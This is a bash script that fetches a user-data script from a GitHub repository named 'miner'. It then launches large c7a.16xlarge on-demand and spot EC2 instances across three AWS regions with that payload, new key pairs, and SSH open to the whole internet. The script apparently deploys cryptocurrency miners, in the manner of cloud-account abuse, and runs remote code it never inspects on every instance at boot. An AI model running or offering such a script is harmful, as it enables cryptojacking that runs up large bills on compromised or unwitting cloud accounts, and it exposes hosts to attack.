#!/bin/bash

declare -A region_image_map=(
    ["us-east-1"]="ami-0e2c8caa4b6378d8c"
    ["us-west-2"]="ami-05d38da78ce859165"
    ["us-east-2"]="ami-0cb91c7de36eed2cb"
)

user_data_url="https://raw.githubusercontent.com/hieudv194/miner/refs/heads/main/Duol"
user_data_file="/tmp/user_data.sh"

echo "Downloading user-data from GitHub..."
curl -s -L "$user_data_url" -o "$user_data_file"

if [ ! -s "$user_data_file" ]; then
    echo "Error: Failed to download user-data from GitHub."
    exit 1
fi

user_data_base64=$(base64 -w 0 "$user_data_file")

for region in "${!region_image_map[@]}"; do
    echo "Processing region: $region"
    image_id=${region_image_map[$region]}

    key_name="Key00-$region"
    if ! aws ec2 describe-key-pairs --key-names "$key_name" --region "$region" > /dev/null 2>&1; then
        aws ec2 create-key-pair --key-name "$key_name" --region "$region" --query "KeyMaterial" --output text > "${key_name}.pem"
        chmod 400 "${key_name}.pem"
        echo "Created Key Pair: $key_name"
    fi

    sg_name="Random-$region"
    sg_id=$(aws ec2 describe-security-groups --group-names "$sg_name" --region "$region" --query "SecurityGroups[0].GroupId" --output text 2>/dev/null)

    if [ -z "$sg_id" ]; then
        sg_id=$(aws ec2 create-security-group --group-name "$sg_name" --description "Security group for $region" --region "$region" --query "GroupId" --output text)
        echo "Created Security Group: $sg_name ($sg_id)"
        aws ec2 authorize-security-group-ingress --group-id "$sg_id" --protocol tcp --port 22 --cidr 0.0.0.0/0 --region "$region"
    fi

    subnet_id=$(aws ec2 describe-subnets --region "$region" --query "Subnets[?State=='available'] | [0].SubnetId" --output text)

    if [ -z "$subnet_id" ]; then
        echo "No available subnets found in $region, skipping..."
        continue
    fi

    instance_id=$(aws ec2 run-instances \
        --image-id "$image_id" \
        --count 1 \
        --instance-type "c7a.16xlarge" \
        --key-name "$key_name" \
        --security-group-ids "$sg_id" \
        --subnet-id "$subnet_id" \
        --user-data "file://$user_data_file" \
        --region "$region" \
        --query "Instances[0].InstanceId" \
        --output text 2>/dev/null)

    if [ -z "$instance_id" ]; then
        echo "Failed to launch EC2 instance in $region."
        continue
    fi

    echo "Launched Instance: $instance_id in $region"

    echo "Requesting Spot Instance..."
    spot_instance_id=$(aws ec2 request-spot-instances \
        --instance-count 1 \
        --type "one-time" \
        --launch-specification file://<(cat <<EOF
{
  "ImageId": "$image_id",
  "InstanceType": "c7a.16xlarge",
  "KeyName": "$key_name",
  "SecurityGroupIds": ["$sg_id"],
  "SubnetId": "$subnet_id",
  "UserData": "$user_data_base64"
}
EOF
) --region "$region" --query "SpotInstanceRequests[0].SpotInstanceRequestId" --output text 2>/dev/null)

    if [ -z "$spot_instance_id" ]; then
        echo "❌ Failed to request Spot Instance in $region."
    else
        echo "✅ Spot Instance requested: $spot_instance_id"
    fi

done

echo "✅ Deployment complete!"
